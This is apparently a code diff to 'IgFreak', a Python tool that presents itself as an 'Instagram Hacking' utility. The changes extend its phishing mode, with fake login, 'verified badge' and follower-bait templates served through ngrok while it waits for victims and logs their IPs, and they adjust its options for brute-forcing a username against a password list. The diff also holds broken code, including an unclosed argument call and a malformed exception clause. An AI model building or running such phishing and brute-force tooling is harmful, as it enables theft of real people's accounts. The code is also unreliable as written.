@@ -73,7 +73,7 @@ def check_d():
             os.system("apt-get update")
             os.system("apt-get install php")
             return check_d()
-check_d()
+
 code = """
 torser="tor"
 if pgrep -x "$torser" > /dev/null
@@ -195,39 +195,43 @@ import argparse
 
 cli_parser = argparse.ArgumentParser(add_help=False)
 # nargs = '+' , makes them positional argument.
-cli_parser.add_argument('--username',  # parse username from command line
+cli_parser.add_argument('-username',  # parse username from command line
                         '-u',
                         type=str,
                         help='username for Instagram account'
                         )
-cli_parser.add_argument('--template',  # parse username from command line
+cli_parser.add_argument('-template',  # parse username from command line
                         '-t',
                         type=str,
                         help='username for Instagram account'
                         )
 
-cli_parser.add_argument('--password-list',  # parse path to password list file
+cli_parser.add_argument('-password-list',  # parse path to password list file
                         '-pl',
                         type=str,
                         help='password list file to try with the given username.'
                         )
 
 cli_parser.add_argument('--verbose',  # check if the user wants verbose mode enabled
-                        '-v',
+                        '--v',
                         action='count',
                         help='Activate Verbose mode. ( Verbose level )'
                         )
                         
 cli_parser.add_argument('--bruteforce',  # parse path to password list file
-                        '-b',
+                        '--b',
                         action='store_true',
                         help='password list file to try with the given username.'
                         )
 cli_parser.add_argument('--phish',  # parse path to password list file
-                        '-p',
+                        '--p',
                         action='store_true',
                         help='Phish any instagram account'
                         )
+cli_parser.add_argument('--report',  # parse path to password list file
+                        '--r',
+                        action='store_true',
+                        help='Phish any instagram account'
 cli_parser.add_argument('--help',  # parse path to password list file
                         '-h','-help',
 						action='store_true',
@@ -255,10 +259,15 @@ def phish(template):
 	print(f"{G} LINK = {Y} {link}")
 	print(f"{G} LINK STATUS CODE = {W}[{G}{requests.get(link).status_code}{W}] ")
 	print()
-	print(f"{B}[{G}>{B}]{W} Wating for victims ...")
+	print(f"{B}[{G}>{B}]{W} Wating for victims ...[ {G} Press Ctrl + C to exit {W} ]")
 	def check_ok():
 		os.system('echo -n "" > ip.txt')
-		os.system("tail -f ip.txt	")			
+		try:
+			os.system("tail -f ip.txt	")
+		except KeyboardInterrupt:
+			print(f"\n\n{Y} Exiting ")
+			os.system('pkill ngrok ')
+			exit(0)			
 	check_ok()
 	exit()
 
@@ -278,7 +287,7 @@ def startServicea(folder,port):
 	return link
 
 def printInfo(str):
-	print(f"{Fore.MAGENTA}IgFreak , Slick Instagram brute force command line tool. Copyright (C) 2021, T-Dynamos Ansh Dadwal\n .")
+	print(f"{Fore.MAGENTA}IgFreak , Slick Instagram Hacking command line tool. Copyright (C) 2021, T-Dynamos Ansh Dadwal\n .")
 	os.system(f"dat=$(date) && echo {G}[{W}✓{G}] {C}Started {str} on {G}$dat")
 def error(str):
 	print()
@@ -327,17 +336,43 @@ def ExecuteIgFreak():
     elif Parsed.help == False:
     	pass
 
-    if Parsed.phish == True:
+    elif Parsed.phish == True:
+    	check_d()
     	if Parsed.template  is not None:
+    		if Parsed.template == "instafollowers" or Parsed.template == "instagram" or Parsed.template == "igbadges":
+    			phish(Parsed.template)
+    		else:
+    			error(f"Template {R+Parsed.template+Y} not found")
+    			print()
+    			print(f"{W} Available Templates")
+    			print(f"""
+{G}Template      Description{W}
+    			
+{B}igbadges       : {W}Hack account by confirming account in get verified badges
+{B}instagram      : {W}Instagram simple login page 
+{B}instafollowers : {W}Get Instagram accounts by seeking followers""")
+    			exit(1)
     		print()
-    		phish(Parsed.template)
-    		exit()
+    		try:
+    			phish(Parsed.template)
+    		except exception:
+    			print(f"\n\n{Y} Exiting ")
+    			pass   			
+    		exit(0)
     	elif Parsed.template is None:
     		print()
     		error("Please Provide a template")
     		exit()
+    elif Parsed.report == True:
+    	if Parsed.username is not None:
+    		print(f"Reporter will be soon supported")
+    		exit(0)
+    	else:
+    		error("Please provide a username")
+    		exit()
+    	
     else:
-    	print()
+    	print(help)
     	pass
 
 
